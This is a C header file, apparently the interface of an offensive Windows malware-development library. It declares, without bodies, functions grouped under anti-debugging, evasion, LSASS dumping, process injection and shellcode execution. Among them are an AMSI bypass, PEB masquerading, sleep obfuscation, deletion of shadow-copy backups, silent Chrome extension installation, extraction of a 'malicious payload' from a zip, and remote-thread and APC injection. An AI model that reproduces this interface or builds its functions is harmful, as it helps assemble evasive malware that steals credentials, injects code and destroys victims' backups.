#pragma once
#include "Internal.h"
#include "StringManipulation.h"
#include "FunctionDeclaration.h"
#include <Ws2tcpip.h>
#include <Dbghelp.h> 
#include <wincrypt.h>
#include <shlwapi.h>
#include <Shlobj.h>
#include <sddl.h>
#include <wtsapi32.h>
#include <psapi.h>
#include <powrprof.h>
#include <Iphlpapi.h>
#include <icmpapi.h>
#include <windns.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <imm.h>
#include <dpa_dsa.h>
#include <winevt.h>
#include <resapi.h>
#include <amsi.h>
#include <SetupAPI.h>
#include <WbemCli.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "Dnsapi.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "PowrProf.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Imm32.lib")
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Wevtapi.lib")
#pragma comment(lib, "ResUtils.lib")
#pragma comment(lib, "Setupapi.lib")


#ifndef NT_SUCCESS
#define NT_SUCCESS(x) ((x)>=0)
#define STATUS_SUCCESS ((NTSTATUS)0)
#endif

#define Get16Bits(d) ((((UINT32)(((CONST UINT8*)(d))[1])) << 8) +(UINT32)(((CONST UINT8*)(d))[0]))

/*******************************************
 RAD HARDWARE BREAKPOINT HOOKING ENGINE DATA
*******************************************/
typedef struct __HARDWARE_ENGINE_INIT_SETTINGS_GLOBAL {
    PVOID HandlerObject;
    BOOL IsInit;
}HARDWARE_ENGINE_INIT_SETTINGS_GLOBAL, * PHARDWARE_ENGINE_INIT_SETTINGS_GLOBAL;

typedef uintptr_t PUINT_VAR_T;
typedef void (WINAPI* EXCEPTION_CALLBACK)(PEXCEPTION_POINTERS);

typedef struct DESCRIPTOR_ENTRY {
    struct DESCRIPTOR_ENTRY* Next;
    struct DESCRIPTOR_ENTRY* Previous;
    PUINT_VAR_T Address;
    DWORD Position;
    DWORD Tid;
    BOOL Dis;
    EXCEPTION_CALLBACK CallbackRoutine;
}DESCRIPTOR_ENTRY, *PDESCRIPTOR_ENTRY;

inline CRITICAL_SECTION CriticalSection = { 0 };
inline DESCRIPTOR_ENTRY* Head = NULL;
inline HARDWARE_ENGINE_INIT_SETTINGS_GLOBAL GlobalHardwareBreakpointObject;


/*******************************************
 ANTI-DEBUGGING
*******************************************/
BOOL AdfCloseHandleOnInvalidAddress(VOID);
BOOL AdfIsCreateProcessDebugEventCodeSet(VOID);
BOOL AdfOpenProcessOnCsrss(VOID);
BOOL IsIntelHardwareBreakpointPresent(VOID);
BOOL CheckRemoteDebuggerPresent2(_In_ HANDLE hHandle, _Inout_ PBOOL pbDebuggerPresent);
BOOL IsDebuggerPresentEx(VOID);


/*******************************************
 CRYPTOGRAPHY RELATED
*******************************************/
DWORD HashStringDjb2A(_In_ LPCSTR String);
DWORD HashStringDjb2W(_In_ LPCWSTR String);
ULONG HashStringFowlerNollVoVariant1aA(_In_ LPCSTR String);
ULONG HashStringFowlerNollVoVariant1aW(_In_ LPCWSTR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ LPCSTR String);
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ LPCWSTR String);
DWORD HashStringLoseLoseA(_In_ LPCSTR String);
DWORD HashStringLoseLoseW(_In_ LPCWSTR String);
INT HashStringRotr32A(_In_ LPCSTR String);
INT HashStringRotr32W(_In_ LPCWSTR String);
DWORD HashStringSdbmA(_In_ LPCSTR String);
DWORD HashStringSdbmW(_In_ LPCWSTR String);
UINT32 HashStringSuperFastHashA(_In_ LPCSTR String);
UINT32 HashStringSuperFastHashW(_In_ LPCWSTR String);
INT HashStringUnknownGenericHash1A(_In_ LPCSTR String);
INT HashStringUnknownGenericHash1W(_In_ LPCWSTR String);
INT32 HashStringSipHashA(_In_ LPCSTR String);
INT32 HashStringSipHashW(_In_ LPCWSTR String);
INT32 HashStringMurmurA(_In_ LPCSTR String);
INT32 HashStringMurmurW(_In_ LPCWSTR String);
BOOL CreateMd5HashFromFilePathW(_In_ LPCWSTR FilePath, _Inout_ PWCHAR Md5Hash);
BOOL CreateMd5HashFromFilePathA(_In_ LPCSTR FilePath, _Inout_ PCHAR Md5Hash);
INT CreatePseudoRandomInteger(_In_ ULONG Seed);
PWCHAR CreatePseudoRandomStringW(_In_ SIZE_T dwLength, _In_ ULONG Seed);
PCHAR CreatePseudoRandomStringA(_In_ SIZE_T dwLength, _In_ ULONG Seed);
BOOL HashFileByMsiFileHashTableW(_In_ LPCWSTR Path, _Inout_ PULONG FileHash);
BOOL HashFileByMsiFileHashTableA(_In_ LPCSTR Path, _Inout_ PULONG FileHash);
ULONG CreatePseudoRandomIntegerFromNtdll(_In_ ULONG Seed);
ULONG LzStandardCompressBuffer(_In_ PBYTE UncompressedBuffer, _In_ ULONG SizeOfUncompressedBufferInBytes, _Inout_ PBYTE CompressedBuffer, _In_ ULONG CompressedBufferSizeInBytes);
ULONG LzStandardDecompressBuffer(_In_ PBYTE CompressedBuffer, _In_ ULONG SizeOfCompressedBufferInBytes, _Inout_ PBYTE DecompressedBuffer, _In_ ULONG DecompressedBufferSizeInBytes);
ULONG LzMaximumCompressBuffer(_In_ PBYTE UncompressedBuffer, _In_ ULONG SizeOfUncompressedBufferInBytes, _Inout_ PBYTE CompressedBuffer, _In_ ULONG CompressedBufferSizeInBytes);
ULONG LzMaximumDecompressBuffer(_In_ PBYTE CompressedBuffer, _In_ ULONG SizeOfCompressedBufferInBytes, _Inout_ PBYTE DecompressedBuffer, _In_ ULONG DecompressedBufferSizeInBytes);
ULONG XpressStandardCompressBuffer(_In_ PBYTE UncompressedBuffer, _In_ ULONG SizeOfUncompressedBufferInBytes, _Inout_ PBYTE CompressedBuffer, _In_ ULONG CompressedBufferSizeInBytes);
ULONG XpressStandardDecompressBuffer(_In_ PBYTE CompressedBuffer, _In_ ULONG SizeOfCompressedBufferInBytes, _Inout_ PBYTE DecompressedBuffer, _In_ ULONG DecompressedBufferSizeInBytes);
ULONG XpressMaximumCompressBuffer(_In_ PBYTE UncompressedBuffer, _In_ ULONG SizeOfUncompressedBufferInBytes, _Inout_ PBYTE CompressedBuffer, _In_ ULONG CompressedBufferSizeInBytes);
ULONG XpressMaximumDecompressBuffer(_In_ PBYTE CompressedBuffer, _In_ ULONG SizeOfCompressedBufferInBytes, _Inout_ PBYTE DecompressedBuffer, _In_ ULONG DecompressedBufferSizeInBytes);
ULONG XpressHuffStandardCompressBuffer(_In_ PBYTE UncompressedBuffer, _In_ ULONG SizeOfUncompressedBufferInBytes, _Inout_ PBYTE CompressedBuffer, _In_ ULONG CompressedBufferSizeInBytes);
ULONG XpressHuffStandardDecompressBuffer(_In_ PBYTE CompressedBuffer, _In_ ULONG SizeOfCompressedBufferInBytes, _Inout_ PBYTE DecompressedBuffer, _In_ ULONG DecompressedBufferSizeInBytes);
ULONG XpressHuffMaximumCompressBuffer(_In_ PBYTE UncompressedBuffer, _In_ ULONG SizeOfUncompressedBufferInBytes, _Inout_ PBYTE CompressedBuffer, _In_ ULONG CompressedBufferSizeInBytes);
ULONG XpressHuffMaximumDecompressBuffer(_In_ PBYTE CompressedBuffer, _In_ ULONG SizeOfCompressedBufferInBytes, _Inout_ PBYTE DecompressedBuffer, _In_ ULONG DecompressedBufferSizeInBytes);
BOOL ExtractFilesFromCabIntoTargetW(LPCWSTR CabFile, LPCWSTR OutputDirectory);
BOOL ExtractFilesFromCabIntoTargetA(LPCSTR CabFile, LPCSTR OutputDirectory);


/*******************************************
 ERROR HANDLING
*******************************************/
DWORD GetLastErrorFromTeb(VOID);
NTSTATUS GetLastNtStatusFromTeb(VOID);
VOID SetLastErrorInTeb(_In_ DWORD ErrorCode);
VOID SetLastNtStatusInTeb(_In_ NTSTATUS Status);
DWORD Win32FromHResult(_In_ HRESULT Result);
DWORD RtlNtStatusToDosErrorViaImport(_In_ NTSTATUS Status);


/*******************************************
 EVASION
*******************************************/
BOOL MasqueradePebAsExplorer(VOID);
BOOL DelayedExecutionExecuteOnDisplayOff(VOID);
BOOL RemoveDllFromPebA(_In_ LPCSTR lpModuleName);
BOOL RemoveDllFromPebW(_In_ LPCWSTR lpModuleName);
BOOL HookEngineUnhookHeapFree(_In_ BOOL StartEngine);
BOOL HookEngineRestoreHeapFree(_In_ BOOL ShutdownEngine);
BOOL SleepObfuscationViaVirtualProtect(_In_ DWORD dwSleepTimeInMilliseconds, _In_ PUCHAR Key);
BOOL RemoveRegisterDllNotification(VOID);
BOOL AmsiBypassViaPatternScan(_In_ DWORD ProcessId);
BOOL RtlSetBaseUnicodeCommandLine(_In_ PWCHAR CommandLinePayload);


/*******************************************
 FINGERPRINTING
*******************************************/
LCID GetCurrentLocaleFromTeb(VOID);
DWORD GetNumberOfLinkedDlls(VOID);
BOOL IsNvidiaGraphicsCardPresentA(VOID);
BOOL IsNvidiaGraphicsCardPresentW(VOID);
BOOL IsProcessRunningA(_In_ LPCSTR ProcessNameWithExtension);
BOOL IsProcessRunningW(_In_ LPCWSTR ProcessNameWithExtension);
BOOL IsProcessRunningAsAdmin(VOID);
ULONG GetOsMajorVersionFromPeb(VOID);
ULONG GetOsMinorVersionFromPeb(VOID);
ULONG GetOsBuildNumberFromPeb(VOID);
ULONG GetOsPlatformIdFromPeb(VOID);
DWORD GetPidFromNtQuerySystemInformationW(_In_ PWCHAR BinaryNameWithFileExtension);
DWORD GetPidFromNtQuerySystemInformationA(_In_ PCHAR BinaryNameWithFileExtension);
DWORD GetPidFromWindowsTerminalServiceW(_In_ PWCHAR BinaryNameWithFileExtension);
DWORD GetPidFromWindowsTerminalServiceA(_In_ PCHAR BinaryNameWithFileExtension);
DWORD GetPidFromWmiComInterfaceW(_In_ PWCHAR BinaryNameWithFileExtension);
DWORD GetPidFromWmiComInterfaceA(_In_ PCHAR BinaryNameWithFileExtension);
DWORD GetPidFromEnumProcessesW(_In_ PWCHAR ProcessNameWithExtension);
DWORD GetPidFromEnumProcessesA(_In_ PCHAR ProcessNameWithExtension);
DWORD GetPidFromPidBruteForcingW(_In_ PWCHAR ProcessNameWithExtension);
DWORD GetPidFromPidBruteForcingA(_In_ PCHAR ProcessNameWithExtension);
DWORD GetPidFromNtQueryFileInformationW(_In_ PWCHAR FullBinaryPath);
DWORD GetPidFromNtQueryFileInformationA(_In_ PCHAR FullBinaryPath);
DWORD GetPidFromPidBruteForcingExW(_In_ PWCHAR ProcessNameWithExtension);
DWORD GetPidFromPidBruteForcingExA(_In_ PCHAR ProcessNameWithExtension);


/*******************************************
 HELPER FUNCTIONS
*******************************************/
BOOL IsPathValidA(_In_ LPCSTR FilePath);
BOOL IsPathValidW(_In_ LPCWSTR FilePath);
BOOL CreateLocalAppDataObjectPathW(_Inout_ PWCHAR pBuffer, _In_ LPCWSTR Path, _In_ DWORD Size, _In_ BOOL bDoesObjectExist);
BOOL CreateLocalAppDataObjectPathA(_Inout_ PCHAR pBuffer, _In_ LPCSTR Path, _In_ DWORD Size, _In_ BOOL bDoesObjectExist);
BOOL GetSystemWindowsDirectoryA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
BOOL GetSystemWindowsDirectoryW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
BOOL CreateWindowsObjectPathW(_Inout_ PWCHAR pBuffer, _In_ PWCHAR Path, _In_ DWORD Size, _In_ BOOL bDoesObjectExist);
BOOL CreateWindowsObjectPathA(_Inout_ PCHAR pBuffer, _In_ PCHAR Path, _In_ DWORD Size, _In_ BOOL bDoesObjectExist);
HANDLE GetProcessHeapFromTeb(VOID);
LPWSTR GetCurrentUserSidW(VOID);
LPSTR GetCurrentUserSidA(VOID);
DWORD GetProcessPathFromLoaderLoadModuleA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
DWORD GetProcessPathFromLoaderLoadModuleW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
DWORD GetProcessPathFromUserProcessParametersA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
DWORD GetProcessPathFromUserProcessParametersW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
BOOL RecursiveFindFileA(_In_ LPCSTR Path, _In_ LPCSTR Pattern);
BOOL RecursiveFindFileW(_In_ LPCWSTR Path, _In_ LPCWSTR Pattern);
DWORD GetCurrentDirectoryFromUserProcessParametersA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
DWORD GetCurrentDirectoryFromUserProcessParametersW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
DWORD GetCurrentProcessIdFromTeb(VOID);
DWORD GetCurrentWindowTextFromUserProcessParametersA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
DWORD GetCurrentWindowTextFromUserProcessParametersW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
LONGLONG GetFileSizeFromPathW(_In_ PWCHAR Path, _In_ DWORD dwFlagsAndAttributes);
LONGLONG GetFileSizeFromPathA(_In_ PCHAR Path, _In_ DWORD dwFlagsAndAttributes);
BOOL SetProcessPrivilegeToken(_In_ DWORD PrivilegeEnum);
BOOL IsDllLoadedW(_In_ LPCWSTR DllName);
BOOL IsDllLoadedA(_In_ LPCSTR DllName);
HMODULE TryLoadDllMultiMethodW(_In_ PWCHAR DllName);
HMODULE TryLoadDllMultiMethodA(_In_ PCHAR DllName);
DWORD CreateThreadAndWaitForCompletion(_In_ LPTHREAD_START_ROUTINE StartAddress, _In_ LPVOID Parameters, _In_ DWORD dwMilliseconds);
BOOL GetProcessBinaryNameFromHwndW(_In_ HWND ProcessHwnd, _Inout_ PWCHAR BinaryName, _In_ DWORD BufferSize);
BOOL GetProcessBinaryNameFromHwndA(_In_ HWND ProcessHwnd, _Inout_ PCHAR BinaryName, _In_ DWORD BufferSize);
BOOL GetByteArrayFromFileW(_Inout_ PBYTE Buffer, _In_ PWCHAR Path, _In_ ULONGLONG BytesToRead);
BOOL GetByteArrayFromFileA(_Inout_ PBYTE Buffer, _In_ PCHAR Path, _In_ ULONGLONG BytesToRead);
BOOL Ex_GetHandleOnDeviceHttpCommunication(_Out_ PHANDLE Handle);
DWORD IsRegistryKeyValidW(_In_ HKEY PredefinedKey, _In_ PWCHAR Path);
BOOL FastcallExecuteBinaryShellExecuteExW(_In_ PWCHAR FullPathToBinary, _In_ PWCHAR OptionalParameters);
BOOL FastcallExecuteBinaryShellExecuteExA(_In_ PCHAR FullPathToBinary, _In_ PCHAR OptionalParameters);
DWORD GetCurrentProcessIdFromOffset(VOID);
HMODULE GetPeFileBaseAddress(VOID);
DWORD64 LdrLoadGetProcedureAddress(VOID);
BOOL IsPeSectionW(_In_ LPCWSTR PathToBinary, _In_ LPCWSTR PeSectionName);
BOOL IsPeSectionA(_In_ LPCSTR PathToBinary, _In_ LPCSTR PeSectionName);
BOOL AddSectionToPeFileW(_In_ LPCWSTR Path, _In_ LPCWSTR SectionName, _In_ DWORD SectionSizeInBytes);
BOOL AddSectionToPeFileA(_In_ LPCSTR Path, _In_ LPCSTR SectionName, _In_ DWORD SectionSizeInBytes);
BOOL WriteDataToPeSectionW(_In_ LPCWSTR Path, _In_ LPCWSTR SectionName, _In_ PBYTE DataToWrite, _In_ DWORD DataToWriteInBytes);
BOOL WriteDataToPeSectionA(_In_ LPCSTR Path, _In_ LPCSTR SectionName, _In_ PBYTE DataToWrite, _In_ DWORD DataToWriteInBytes);
DWORD GetPeSectionSizeInBytesW(_In_ LPCWSTR Path, _In_ LPCWSTR SectionName);
DWORD GetPeSectionSizeInBytesA(_In_ LPCSTR Path, _In_ LPCSTR SectionName);
BOOL ReadDataFromPeSectionW(_In_ LPCWSTR Path, _In_ LPCWSTR SectionName, _Inout_ PBYTE ReadData, _Inout_opt_ PDWORD DataReadInBytes);
BOOL ReadDataFromPeSectionA(_In_ LPCSTR Path, _In_ LPCSTR SectionName, _Inout_ PBYTE ReadData, _Inout_opt_ PDWORD DataReadInBytes);
HANDLE GetCurrentProcessNoForward(VOID);
HANDLE GetCurrentThreadNoForward(VOID);


/*******************************************
 LIBRARY LOADING
*******************************************/
PTEB GetTeb(VOID);
PPEB GetPeb(VOID);
PPEB GetPebFromTeb(VOID);
PKUSER_SHARED_DATA GetKUserSharedData(VOID);
PRTL_USER_PROCESS_PARAMETERS GetRtlUserProcessParameters(VOID);
DWORD64 GetProcAddressDjb2(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressFowlerNollVoVariant1a(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressJenkinsOneAtATime32Bit(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressLoseLose(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressRotr32(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressSdbm(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressSuperFastHash(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressUnknownGenericHash1(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressSipHash(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressMurmur(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 GetProcAddressA(_In_ DWORD64 ModuleBase, _In_ LPCSTR lpProcName);
DWORD64 GetProcAddressW(_In_ DWORD64 ModuleBase, _In_ LPCWSTR lpProcName);
BOOL RtlLoadPeHeaders(_Inout_ PIMAGE_DOS_HEADER* Dos, _Inout_ PIMAGE_NT_HEADERS* Nt, _Inout_ PIMAGE_FILE_HEADER* File, _Inout_ PIMAGE_OPTIONAL_HEADER* Optional, _Inout_ PBYTE* ImageBase);
HMODULE GetModuleHandleEx2A(_In_ LPCSTR lpModuleName);
HMODULE GetModuleHandleEx2W(_In_ LPCWSTR lpModuleName);
HMODULE ProxyWorkItemLoadLibraryW(_In_ LPCWSTR lpModuleName);
HMODULE ProxyWorkItemLoadLibraryA(_In_ LPCSTR lpModuleName);
HMODULE ProxyRegisterWaitLoadLibraryW(_In_ LPCWSTR lpModuleName);
HMODULE ProxyRegisterWaitLoadLibraryA(_In_ LPCSTR lpModuleName);


/*******************************************
 LSASS DUMPING
*******************************************/
DWORD MpfGetLsaPidFromRegistry(VOID);
DWORD MpfGetLsaPidFromServiceManager(VOID);
DWORD MpfGetLsaPidFromNamedPipe(VOID);


/*******************************************
 NETWORK CONNECTIVITY
*******************************************/
DWORD UrlDownloadToFileSynchronousW(_In_ PWCHAR Url, _In_ PWCHAR SavePath);
DWORD UrlDownloadToFileSynchronousA(_In_ PCHAR Url, _In_ PCHAR SavePath);
BOOL SendIcmpEchoMessageToIPv4HostW(_In_ PWCHAR IpAddress, _Inout_ PDWORD Status, _Inout_ PDWORD RoundTripTime, _Inout_ PWCHAR EchoReplyAddress);
BOOL SendIcmpEchoMessageToIPv4HostA(_In_ PCHAR IpAddress, _Inout_ PDWORD Status, _Inout_ PDWORD RoundTripTime, _Inout_ PCHAR EchoReplyAddress);
ULONG ConvertIPv4StringToUnsignedLongW(_In_ PWCHAR IpAddress);
ULONG ConvertIPv4StringToUnsignedLongA(_In_ PCHAR IpAddress);
BOOL ConvertIPv4IpAddressStructureToStringW(_In_ PIN_ADDR Address, _Out_ PWCHAR Buffer);
BOOL ConvertIPv4IpAddressStructureToStringA(_In_ PIN_ADDR Address, _Out_ PCHAR Buffer);
BOOL ConvertIPv4IpAddressUnsignedLongToStringW(_In_ ULONG Address, _Out_ PWCHAR Buffer);
BOOL ConvertIPv4IpAddressUnsignedLongToStringA(_In_ ULONG Address, _Out_ PCHAR Buffer);
DWORD DnsGetDomainNameIPv4AddressAsStringW(_In_ PWCHAR DomainName, _Inout_ PWCHAR IPv4IPAddress);
DWORD DnsGetDomainNameIPv4AddressAsStringA(_In_ PCHAR DomainName, _Inout_ PCHAR IPv4IPAddress);
ULONG DnsGetDomainNameIPv4AddressUnsignedLongW(_In_ PWCHAR DomainName);
ULONG DnsGetDomainNameIPv4AddressUnsignedLongA(_In_ PCHAR DomainName);
BOOL GetDomainNameFromUnsignedLongIPV4AddressW(_In_ ULONG IpAddress, _Inout_ PWCHAR DomainName);
BOOL GetDomainNameFromUnsignedLongIPV4AddressA(_In_ ULONG IpAddress, _Inout_ PCHAR DomainName);
BOOL GetDomainNameFromIPV4AddressAsStringW(_In_ PWCHAR IpAddress, _Inout_ PWCHAR DomainName);
BOOL GetDomainNameFromIPV4AddressAsStringA(_In_ PCHAR IpAddress, _Inout_ PCHAR DomainName);


/*******************************************
 OTHER
*******************************************/
DWORD OleGetClipboardDataA(_Inout_ PCHAR Buffer);
DWORD OleGetClipboardDataW(_Inout_ PWCHAR Buffer);
DWORD MpfComVssDeleteShadowVolumeBackups(_In_ BOOL CoUninitializeAfterCompletion);
BOOL MpfComModifyShortcutTargetW(_In_ PWCHAR LnkPath, _In_  PWCHAR LnkExecutionProperty);
BOOL MpfComModifyShortcutTargetA(_In_ PCHAR LnkPath, _In_  PCHAR LnkExecutionProperty);
DWORD MpfComMonitorChromeSessionOnce(VOID);
BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginW(_In_ PWCHAR ExtensionIdentifier);
BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginA(_In_ PCHAR ExtensionIdentifier);
BOOL MpfExtractMaliciousPayloadFromZipFileNoPasswordW(_In_ PWCHAR FullPathToZip, _In_ PWCHAR FullPathToExtractionDirectory);
BOOL MpfExtractMaliciousPayloadFromZipFileNoPasswordA(_In_ PCHAR FullPathToZip, _In_ PCHAR FullPathToExtractionDirectory);


/*******************************************
 PROCESS CREATION
*******************************************/
HRESULT CreateProcessFromIHxInteractiveUserW(_In_ PWCHAR UriFile);
HRESULT CreateProcessFromIHxInteractiveUserA(_In_ PCHAR UriFile);
HRESULT CreateProcessFromIHxHelpPaneServerW(_In_ PWCHAR UriFile);
HRESULT CreateProcessFromIHxHelpPaneServerA(_In_ PCHAR UriFile);
DWORD CreateProcessFromShellExecuteInExplorerProcessW(_In_ PWCHAR BinaryPath);
DWORD CreateProcessFromShellExecuteInExplorerProcessA(_In_ PCHAR BinaryPath);
DWORD CreateProcessFromIShellDispatchInvokeW(_In_ PWCHAR BinaryPath);
DWORD CreateProcessFromIShellDispatchInvokeA(_In_ PCHAR BinaryPath);
DWORD CreateProcessViaNtCreateUserProcessW(PWCHAR FullBinaryPath);
DWORD CreateProcessViaNtCreateUserProcessA(PCHAR FullBinaryPath);
DWORD CreateProcessByWindowsRHotKeyW(_In_ PWCHAR FullPathToBinary);
DWORD CreateProcessByWindowsRHotKeyA(_In_ PCHAR FullPathToBinary);
DWORD CreateProcessByWindowsRHotKeyExW(_In_ PWCHAR FullPathToBinary);
DWORD CreateProcessByWindowsRHotKeyExA(_In_ PCHAR FullPathToBinary);
BOOL CreateProcessFromINFSectionInstallStringNoCabW(_In_ LPCWSTR PathToInfFile, _In_ LPCWSTR NameOfSection);
BOOL CreateProcessFromINFSectionInstallStringNoCabA(_In_ LPCSTR PathToInfFile, _In_ LPCSTR NameOfSection);
BOOL CreateProcessFromINFSetupCommandW(_In_ LPCWSTR PathToInfFile, _In_ LPCWSTR NameOfSection);
BOOL CreateProcessFromINFSetupCommandA(_In_ LPCSTR PathToInfFile, _In_ LPCSTR NameOfSection);
BOOL CreateProcessFromPcwUtilW(_In_ LPCWSTR PathToBinary);
BOOL CreateProcessFromPcwUtilA(_In_ LPCSTR PathToBinary);
BOOL CreateProcessFromINFSectionInstallStringNoCab2A(_In_ LPCSTR PathToInfFile, _In_ LPCSTR NameOfSection);
BOOL CreateProcessFromINFSectionInstallStringNoCab2W(_In_ LPCWSTR PathToInfFile, _In_ LPCWSTR NameOfSection);
BOOL CreateProcessFromIeFrameOpenUrlW(_In_ LPCWSTR PathToUrlFile);
BOOL CreateProcessFromIeFrameOpenUrlA(_In_ LPCSTR PathToUrlFile);
BOOL CreateProcessFromShdocVwOpenUrlW(_In_ LPCWSTR PathToUrlFile);
BOOL CreateProcessFromShdocVwOpenUrlA(_In_ LPCSTR PathToUrlFile);
BOOL CreateProcessFromShell32ShellExecRunW(_In_ LPCWSTR PathToFile);
BOOL CreateProcessFromShell32ShellExecRunA(_In_ LPCSTR PathToFile);
BOOL CreateProcessFromUrlOpenUrlW(_In_ LPCWSTR PathToUrlFile);
BOOL CreateProcessFromUrlOpenUrlA(_In_ LPCSTR PathToUrlFile);
BOOL CreateProcessFromUrlFileProtocolHandlerW(_In_ LPCWSTR PathToUrlFile);
BOOL CreateProcessFromUrlFileProtocolHandlerA(_In_ LPCSTR PathToUrlFile);
BOOL CreateProcessFromZipfldrRouteCallW(_In_ LPCWSTR PathToFile);
BOOL CreateProcessFromZipfldrRouteCallA(_In_ LPCSTR PathToFile);
BOOL CreateProcessFromMsHTMLW(_In_ LPCWSTR MshtaCommand);
DWORD MpfExecute64bitPeBinaryInMemoryFromByteArrayNoReloc(_In_ PBYTE BinaryImage);
BOOL CreateProcessWithCfGuardW(_Inout_ PPROCESS_INFORMATION Pi, _In_ PWCHAR Path);
BOOL CreateProcessWithCfGuardA(_Inout_ PPROCESS_INFORMATION Pi, _In_ PCHAR Path);
DWORD CreateProcessFromWmiWin32_ProcessW(LPCWSTR BinaryPath);


/*******************************************
 PROCESS INJECTION
*******************************************/
BOOL MpfPiWriteProcessMemoryCreateRemoteThread(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetProcessId);
BOOL MpfPiQueueUserAPCViaAtomBomb(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetThreadId);
BOOL MpfPiControlInjection(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetProcessId);
BOOL MpfProcessInjectionViaProcessReflection(_In_ PBYTE Shellcode, _In_ DWORD dwSizeOfShellcodeInBytes, _In_ DWORD TargetPid);


/*******************************************
 PROXIED FUNCTIONS
*******************************************/
HANDLE IeCreateFileW(_In_ LPCWSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
HANDLE IeCreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
BOOL DeleteDirectoryAndSubDataViaDelNodeW(_In_ LPCWSTR FullPathToDirectory);
BOOL DeleteDirectoryAndSubDataViaDelNodeA(_In_ LPCSTR FullPathToDirectory);
BOOL CopyFileViaSetupCopyFileW(_In_ LPCWSTR Source, _In_ LPCWSTR Destination);
BOOL CopyFileViaSetupCopyFileA(_In_ LPCSTR Source, _In_ LPCSTR Destination);
BOOL IsProcessRunningAsAdmin2(VOID);
BOOL DeleteFileWithCreateFileFlagA(_In_ PCHAR Path);
BOOL DeleteFileWithCreateFileFlagW(_In_ PWCHAR Path);
BOOL CreateFileFromDsCopyFromSharedFileW(_In_ PWCHAR NewFileName, _In_ PWCHAR FileToClone);
BOOL CreateFileFromDsCopyFromSharedFileA(_In_ PCHAR NewFileName, _In_ PCHAR FileToClone);
BOOL IeCreateDirectoryW(_In_ LPCWSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes);
BOOL IeCreateDirectoryA(_In_ LPCSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes);
BOOL IeDeleteFileW(_In_ LPCWSTR lpFileName);
BOOL IeDeleteFileA(_In_ LPCSTR lpFileName);
HANDLE IeFindFirstFileW(_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
HANDLE IeFindFirstFileA(_In_ LPCSTR lpFileName, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
BOOL IEGetFileAttributesExW(_In_ LPCWSTR lpFileName, _In_ GET_FILEEX_INFO_LEVELS fInfoLevelId, _Out_ LPVOID lpFileInformation);
BOOL IEGetFileAttributesExA(_In_ LPCSTR lpFileName, _In_ GET_FILEEX_INFO_LEVELS fInfoLevelId, _Out_ LPVOID lpFileInformation);
BOOL IEMoveFileExW(_In_ LPCWSTR lpExistingFileName, _In_ LPCWSTR lpNewFileName, _In_ DWORD dwFlags);
BOOL IEMoveFileExA(_In_ LPCSTR lpExistingFileName, _In_ LPCSTR lpNewFileName, _In_ DWORD dwFlags);
BOOL IERemoveDirectoryW(_In_ LPCWSTR lpPathName);
BOOL IERemoveDirectoryA(_In_ LPCSTR lpPathName);


/*******************************************
 SHELLCODE EXECUTION
*******************************************/
BOOL MpfSceViaEnumChildWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaCDefFolderMenu_Create2(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaCertEnumSystemStore(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaCertEnumSystemStoreLocation(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
